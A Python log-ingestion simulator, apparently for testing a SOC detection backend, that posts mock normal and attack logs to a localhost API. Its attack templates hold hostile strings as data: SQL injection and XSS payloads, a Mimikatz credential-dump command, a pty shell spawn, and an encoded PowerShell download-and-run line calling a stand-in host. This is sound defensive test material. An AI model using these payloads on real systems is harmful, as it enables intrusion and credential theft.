import time
import random
import requests
from datetime import datetime

API_URL = "http://localhost:8000/api/logs/upload"

SOURCES = ["Windows-DC", "Linux-Web", "Firewall-Core", "Nginx-Reverse-Proxy", "AWS-CloudTrail"]
USERNAMES = ["admin", "analyst", "db_user", "jdoe", "sysadmin", "system", "web_app"]
IP_ADDRESSES = [
    "192.168.1.50", "10.0.0.15", "172.16.2.20",  # Internal clean
    "185.190.140.23", "45.142.120.66", "103.42.100.10", "91.220.101.5",  # Simulated malicious (external)
    "8.8.8.8", "1.1.1.1"  # DNS public clean
]

ATTACK_TEMPLATES = [
    {
        "name": "SQL Injection Attack",
        "logs": [
            {
                "source": "Nginx-Reverse-Proxy",
                "event_id": 403,
                "message": "GET /products?id=1%20OR%20'1'='1' HTTP/1.1 - 403 Forbidden",
                "severity": "High",
                "username": "guest"
            }
        ]
    },
    {
        "name": "PowerShell Abuse",
        "logs": [
            {
                "source": "Windows-DC",
                "event_id": 4104,
                "message": "Execute Script Block: powershell.exe -nop -exec bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBvAHQAbgBlAHQALgBjADIALwBzACcAKQA=",
                "severity": "High",
                "username": "sysadmin"
            }
        ]
    },
    {
        "name": "Credential Dumping",
        "logs": [
            {
                "source": "Windows-DC",
                "event_id": 4662,
                "message": "An attempt was made to access LSASS memory dump via Mimikatz tool: sekurlsa::logonpasswords",
                "severity": "Critical",
                "username": "system"
            }
        ]
    },
    {
        "name": "Privilege Escalation",
        "logs": [
            {
                "source": "Linux-Web",
                "event_id": 1002,
                "message": "sudo: root privilege granted to web_app for running /usr/bin/python -c 'import pty; pty.spawn(\"/bin/sh\")'",
                "severity": "High",
                "username": "web_app"
            }
        ]
    },
    {
        "name": "XSS Attempt",
        "logs": [
            {
                "source": "Nginx-Reverse-Proxy",
                "event_id": 200,
                "message": "POST /comment/add HTTP/1.1 - body: text=<script>alert(document.cookie)</script> - 200 OK",
                "severity": "Medium",
                "username": "jdoe"
            }
        ]
    }
]

def generate_normal_log():
    src = random.choice(SOURCES)
    user = random.choice(USERNAMES)
    ip = random.choice(IP_ADDRESSES)
    
    # Check if IP is simulated malicious
    ip_first = int(ip.split(".")[0]) if "." in ip else 0
    is_malicious_ip = ip_first in [185, 45, 103, 91]
    
    # If malicious IP is picked for normal logs, override to clean for normal log consistency, or keep standard logins
    if is_malicious_ip and random.random() > 0.3:
        ip = "192.168.1." + str(random.randint(100, 200))
        
    messages = [
        f"User login successful for account: {user}",
        f"Session established for user {user} from IP {ip}",
        "GET /index.html HTTP/1.1 - 200 OK",
        "GET /static/css/main.css HTTP/1.1 - 200 OK",
        "Connection established to database cluster core-db-1",
        "Firewall rule ALLOW: outbound tcp connection to port 443",
        "CPU Usage within thresholds (12.4%)",
        "Scheduled audit backup completed successfully.",
        f"Password updated successfully for user {user} via web UI."
    ]
    
    return {
        "timestamp": datetime.utcnow().isoformat(),
        "source": src,
        "event_id": random.randint(1000, 5000),
        "message": random.choice(messages),
        "severity": "Informational",
        "ip_address": ip,
        "username": user
    }

def generate_brute_force_sequence():
    """Generates 6 rapid failed login attempts from a malicious IP"""
    ip = random.choice(["185.190.140.23", "45.142.120.66", "91.220.101.5"])
    user = "administrator"
    logs = []
    for _ in range(6):
        logs.append({
            "timestamp": datetime.utcnow().isoformat(),
            "source": "Windows-DC",
            "event_id": 4625,
            "message": f"Logon Failure: Invalid password provided for account '{user}'. Event 4625.",
            "severity": "Medium",
            "ip_address": ip,
            "username": user
        })
    return logs

def generate_port_scan_sequence():
    """Generates rapid connections to multiple ports from same IP"""
    ip = random.choice(["103.42.100.10", "45.142.120.66"])
    target_ports = [21, 22, 23, 80, 139, 445, 8080, 3389]
    logs = []
    for port in target_ports:
        logs.append({
            "timestamp": datetime.utcnow().isoformat(),
            "source": "Firewall-Core",
            "event_id": 1024,
            "message": f"Firewall DROP: TCP connection rejected from IP {ip} to internal port {port}",
            "severity": "Low",
            "ip_address": ip,
            "username": None
        })
    return logs

def main():
    print("====================================================")
    print("SOC AUTOMATION LOG INGESTION SIMULATOR")
    print("Sending live mock threat and normal logs to API...")
    print(f"Target API: {API_URL}")
    print("Press Ctrl+C to stop.")
    print("====================================================")
    
    while True:
        try:
            # 1. Decide what to send
            roll = random.random()
            logs_to_send = []
            attack_name = None
            
            if roll < 0.08:
                # Brute Force attack
                attack_name = "Brute Force Sequence"
                logs_to_send = generate_brute_force_sequence()
            elif roll < 0.15:
                # Port Scan attack
                attack_name = "Port Scan Sequence"
                logs_to_send = generate_port_scan_sequence()
            elif roll < 0.30:
                # Signature-based attack (SQLi, XSS, PowerShell, Mimikatz)
                template = random.choice(ATTACK_TEMPLATES)
                attack_name = template["name"]
                log = template["logs"][0].copy()
                log["timestamp"] = datetime.utcnow().isoformat()
                log["ip_address"] = random.choice(["185.190.140.23", "45.142.120.66", "103.42.100.10"])
                logs_to_send = [log]
            else:
                # Normal network traffic
                logs_to_send = [generate_normal_log() for _ in range(random.randint(1, 3))]
                
            # 2. POST the payload
            payload = {"logs": logs_to_send}
            response = requests.post(API_URL, json=payload, timeout=5)
            
            if response.status_code == 200:
                if attack_name:
                    print(f"🔥 [ATTACK INJECTED] {attack_name} - Sent {len(logs_to_send)} log(s) successfully.")
                else:
                    print(f"🟢 [NORMAL TRAFFIC] Sent {len(logs_to_send)} background network log(s).")
            else:
                print(f"⚠️ [ERROR] Server responded with code: {response.status_code}")
                
        except requests.exceptions.ConnectionError:
            print("❌ [CONNECTION ERROR] Failed to connect to FastAPI backend. Is it running on http://localhost:8000?")
        except Exception as e:
            print(f"❌ [UNEXPECTED ERROR] {e}")
            
        # Wait before sending next batch
        time.sleep(random.uniform(2.0, 5.0))

if __name__ == "__main__":
    main()
